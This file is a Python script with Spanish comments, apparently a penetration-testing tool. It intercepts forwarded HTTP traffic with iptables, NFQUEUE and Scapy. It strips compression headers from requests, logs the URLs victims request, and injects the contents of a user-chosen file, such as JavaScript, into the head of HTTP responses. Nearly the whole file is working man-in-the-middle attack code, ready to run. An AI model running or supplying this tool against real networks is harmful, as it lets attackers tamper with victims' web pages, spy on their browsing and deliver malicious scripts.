#!/bin/python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import argparse
from colorama import init, Fore
import os
from subprocess import call
import re


parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Interfaz a configurar. Ejemplo: ./codeInjector.py -i eth0")
parser.add_argument("-f", "--file", dest="file", help="Fichero con código para añadir a la respuesta. Ejemplo: ./codeInjector.py -i eth0 -f alert.js")
options = parser.parse_args()

init()

GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Fore.RESET


# COMPROBAR USUARIO ROOT Y FORWARDING ACTIVADO
if os.geteuid() != 0:
    print ("¡EJECUTA COMO ROOT!".center(100, "="))
    exit()
else:
    print ( f"{BLUE}[+] Comprobando forwarding...{RESET}" )
    call(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'])
    call(['sudo', 'iptables', '-A', 'FORWARD', '-i', str(options.interface), '-j', 'NFQUEUE', '--queue-num', '5'])


print ( f'\n{GREEN}[+] Interceptando respuestas...{RESET}' )


def setLoad(packet, newLoad):
    
    packet[Raw].load = newLoad

    del packet[IP].len 
    del packet[IP].chksum
    del packet[TCP].chksum

    return packet

def processPackets(packet):  # Función de llamada
    scapyPacket = IP(packet.get_payload())  # Se convierten los datos a paquetes de Scapy

    if scapyPacket.haslayer(Raw) and scapyPacket.haslayer(TCP):
        
        newLoad = scapyPacket[Raw].load.decode(errors="ignore")

        if scapyPacket[TCP].dport == 80:

            try:
                # Extracción del host y recurso pedido

                loadText = str(scapyPacket[Raw].load)
                queryStart = "GET"
                queryEnd = "HTTP"

                idx1 = loadText.index(queryStart)
                idx2 = loadText.index(queryEnd)

                res = ''
                for idx in range(idx1 + len(queryStart) + 1, idx2 - 1):
	                res = res + loadText[idx]
                URL = res
                print ( f"{GREEN}[+] Petición de {URL} en {scapyPacket[IP].dst} por {scapyPacket[IP].src} {RESET}" )
       
            except:
                return

            newLoad = re.sub(r"Accept-Encoding:.*?\r\n", "", newLoad)  # Se elimina la cabecera para poder tratar las respuestas como texto sin codificar
        
        elif scapyPacket[TCP].sport == 80:
            with open(options.file, "r") as text:
                text2add = text.read()
            
            try:

                # Se recalcula la longitud de contenido para que la web se renderice correctamente. Al tamaño original se le suma el doble del tamaño del fichero añadido como parámetro
                lengthSearch = re.search("(?:Content-Length:.)(\d*)\r\n", newLoad)
                if lengthSearch:
                    length = lengthSearch.group(1)
                    newLength = int(length) + len(text2add)*2
               
                    newLoad = re.sub(length, str(newLength), newLoad)
                
                print (f'{GREEN}[+] Cargando código: {RESET}{YELLOW}{text2add}{RESET}')
                newLoad = newLoad.replace('</head>', f'{text2add}</head>')
                # Se añade el código antes del cierre de la etiqueta 'head'. Modificar en base al lenguaje o añadir las etiquetas correspondientes en el propio archivo
            
            except:
                return
        
        if newLoad != scapyPacket[Raw].load:
            newPacket = setLoad(scapyPacket, newLoad)
            packet.set_payload(bytes(newPacket))   

    packet.accept()  # Se reenvían los paquetes encolados
queue = NetfilterQueue()
queue.bind(5, processPackets)  # Se une la cola que creamos con la de la regla en IPTables mediante el número. Como segundo parámetro se establece una función de llamada

queue.run()
